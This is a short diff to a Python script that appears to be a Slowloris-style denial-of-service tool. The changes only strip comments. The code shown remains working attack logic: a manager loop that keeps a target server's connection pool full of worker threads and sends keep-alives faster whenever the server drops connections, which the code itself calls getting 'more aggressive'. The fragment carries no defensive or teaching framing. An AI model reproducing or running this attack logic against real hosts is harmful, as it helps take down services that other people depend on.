@@ -144,7 +144,7 @@ def main():
     threads = []
     worker_counter = 0
     try:
-        # This is the main manager loop, inspired by 'advanced_slowloris.py' for its effectiveness.
+        # This is the main manager loop
         while not stop_event.is_set():
             # Prune dead threads to get an accurate count of active connections
             num_before_prune = len(threads)
@@ -152,8 +152,6 @@ def main():
             num_after_prune = len(threads)
             dropped_count = num_before_prune - num_after_prune
             
-            # --- AGGRESSIVE DYNAMIC PACING LOGIC ---
-            # This is the core logic from the simple, working script.
             # If the server is dropping our connections, we get more aggressive.
             if dropped_count > (args.connections * 0.05) and dropped_count > 5:
                 # Decrease sleep interval to send keep-alives more frequently
@@ -164,8 +162,6 @@ def main():
                 attack_state.set_sleep(attack_state.sleep_interval + 1)
             # ----------------------------------------
 
-            # --- AGGRESSIVE REPLENISHMENT ---
-            # Immediately create new workers to replace any that have died.
             while len(threads) < args.connections:
                 worker = SocketWorker(args.hostname, args.port, args.header_size, attack_state, worker_counter)
                 worker.start()
